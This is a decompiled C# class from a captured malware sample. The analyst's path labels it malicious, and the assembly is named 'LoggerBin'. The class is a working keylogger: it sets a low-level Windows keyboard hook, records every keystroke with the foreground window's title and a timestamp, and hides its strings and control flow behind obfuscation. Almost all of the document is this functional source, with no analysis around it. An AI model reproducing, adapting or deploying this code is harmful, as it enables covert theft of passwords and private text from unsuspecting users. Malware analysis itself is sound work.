// Decompiled with JetBrains decompiler
// Type: xWC.OWW
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using VW1;

namespace xWC
{
  internal static class OWW
  {
    public static StringBuilder loggerData;
    private static string CurrentActiveWindowTitle;
    private const int WM_KEYDOWN = 256;
    private static OWW.sW6 _proc;
    private static IntPtr _hookID;
    private static int WHKEYBOARDLL;
    private static OWW ITo;

    public static string fW5()
    {
      if (!Convert.ToBoolean(XWr.EnableKeylogger))
        return w4.bx(666, w4.vY);
      return string.IsNullOrWhiteSpace(OWW.loggerData.ToString()) ? w4.bx(9610, w4.vY) : OWW.loggerData.ToString().Replace(w4.bx(822, w4.vY), Environment.NewLine);
    }

    public static void QWI()
    {
      OWW._hookID = OWW.rT3((object) OWW._proc);
      Application.Run();
    }

    private static IntPtr dWl(OWW.sW6 _param0)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
        return OWW.cWS(OWW.WHKEYBOARDLL, _param0, qdk.bx(currentProcess.ProcessName, qdk.RdK), 0U);
    }

    private static IntPtr rWZ(int _param0, IntPtr _param1, IntPtr _param2)
    {
      if (_param0 >= 0 && _param1 == (IntPtr) 256)
      {
        int num1 = Marshal.ReadInt32(_param2);
        bool flag1 = ((uint) XdO.bx(20, XdO.rdT) & (uint) ushort.MaxValue) > 0U;
        bool flag2 = ((int) XdO.bx(160, XdO.rdT) & 32768) != 0 || ((uint) XdO.bx(161, XdO.rdT) & 32768U) > 0U;
        int num2 = ((int) XdO.bx(162, XdO.rdT) & 32768) != 0 ? 1 : (((uint) XdO.bx(163, XdO.rdT) & 32768U) > 0U ? 1 : 0);
        string str1 = jdj.bx((uint) num1, jdj.Gdg);
        string str2 = !(flag1 | flag2) ? (string) OWW.nTZ((object) str1) : str1.ToUpper();
        if (num2 == 0)
          goto label_14;
        else
          goto label_24;
label_9:
        if (!OWW.UTx((object) OWW.CurrentActiveWindowTitle, (object) kdq.bx(kdq.sdn)))
        {
          OWW.loggerData.Append(w4.bx(9778, w4.vY) + kdq.bx(kdq.sdn) + w4.bx(822, w4.vY));
          OWW.loggerData.Append(str2);
          goto label_20;
        }
        else
        {
          OWW.loggerData.Append(str2);
          goto label_20;
        }
label_14:
        if (num1 < 112)
          goto label_2;
        else
          goto label_15;
label_1:
        Keys keys;
        string str3;
        int num3;
        switch (num3)
        {
          case 1:
            if (str3 == w4.bx(9688, w4.vY))
            {
              str2 = w4.bx(9764, w4.vY);
              goto label_9;
            }
            else
              goto label_9;
          case 2:
            goto label_11;
          case 3:
            if (num1 <= 135)
            {
              string str4 = w4.bx(9618, w4.vY);
              keys = (Keys) num1;
              string str5 = keys.ToString();
              string str6 = w4.bx(9624, w4.vY);
              str2 = str4 + str5 + str6;
              goto label_9;
            }
            else
              break;
          default:
            goto label_5;
        }
label_2:
        keys = (Keys) num1;
        str3 = keys.ToString();
        if (str3 == w4.bx(9630, w4.vY))
        {
          str2 = w4.bx(9698, w4.vY);
          goto label_9;
        }
        else if (!(str3 == w4.bx(9644, w4.vY)))
        {
          if (str3 == w4.bx(9660, w4.vY))
          {
            str2 = w4.bx(9734, w4.vY);
            goto label_9;
          }
          else if (!(str3 == w4.bx(9676, w4.vY)))
          {
            num3 = 1;
            if (OWW.fTR() != null)
            {
              int num4;
              num3 = num4;
              goto label_1;
            }
            else
              goto label_1;
          }
        }
        else
          goto label_11;
label_5:
        str2 = w4.bx(9748, w4.vY);
        goto label_9;
label_11:
        str2 = w4.bx(9716, w4.vY);
        goto label_9;
label_15:
        num3 = 3;
        goto label_1;
label_24:
        if (num1 == 88 || (num1 == 67 || num1 == 86))
        {
          str2 = string.Empty;
          goto label_9;
        }
        else
          goto label_9;
      }
label_20:
      return gdw.bx(OWW._hookID, _param0, _param1, _param2, gdw.YdF);
    }

    private static string QW4(uint _param0)
    {
      try
      {
        StringBuilder stringBuilder = new StringBuilder();
        byte[] numArray = new byte[256];
        if (!fd1.bx(numArray, fd1.td0))
          return "";
        uint num1 = hd2.bx(_param0, 0U, hd2.idh);
        uint num2;
        IntPtr num3 = CdU.bx(Kdu.bx(txz.bx(txz.vdV), ref num2, Kdu.tdG), CdU.kda);
        int num4 = 0;
        if (OWW.ETm())
          goto label_4;
label_3:
        switch (num4)
        {
          default:
            Gdv.bx(_param0, num1, numArray, stringBuilder, 5, 0U, num3, Gdv.cdc);
            return stringBuilder.ToString();
        }
label_4:
        num4 = 0;
        goto label_3;
      }
      catch
      {
      }
      return ((Keys) _param0).ToString();
    }

    private static string jWj()
    {
      try
      {
        uint num1;
        int num2 = (int) Kdu.bx(txz.bx(txz.vdV), ref num1, Kdu.tdG);
        Process processById = Process.GetProcessById((int) num1);
        OWW.CurrentActiveWindowTitle = w4.bx(9618, w4.vY) + DateTime.Now.ToString(w4.bx(9556, w4.vY)) + w4.bx(9786, w4.vY) + processById.MainWindowTitle + w4.bx(9624, w4.vY);
        return OWW.CurrentActiveWindowTitle;
      }
      catch (Exception ex)
      {
      }
      return w4.bx(9798, w4.vY);
    }

    [DllImport("user32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr cWS(
      int _param0,
      OWW.sW6 _param1,
      IntPtr _param2,
      uint _param3);

    [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr VWt(
      IntPtr _param0,
      int _param1,
      IntPtr _param2,
      IntPtr _param3);

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr mWQ(string _param0);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    private static extern IntPtr BWK();

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
    private static extern uint SWd(IntPtr _param0, out uint _param1);

    [DllImport("user32.dll", EntryPoint = "GetKeyState", CharSet = CharSet.Auto)]
    private static extern short lW7(int _param0);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool JWE(byte[] _param0);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardLayout")]
    private static extern IntPtr fWq(uint _param0);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    private static extern int UWB(
      uint _param0,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    private static extern uint uWi(uint _param0, uint _param1);

    static OWW()
    {
      yd.bx(yd.EI);
      OWW.loggerData = new StringBuilder();
      OWW._proc = new OWW.sW6(OWW.rWZ);
      OWW._hookID = IntPtr.Zero;
      OWW.WHKEYBOARDLL = 13;
    }

    internal static bool ETm() => OWW.ITo == null;

    internal static OWW fTR() => OWW.ITo;

    internal static IntPtr rT3([In] object obj0) => OWW.dWl((OWW.sW6) obj0);

    internal static object nTZ([In] object obj0) => (object) ((string) obj0).ToLower();

    internal static bool UTx([In] object obj0, [In] object obj1) => (string) obj0 == (string) obj1;

    private delegate IntPtr sW6(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
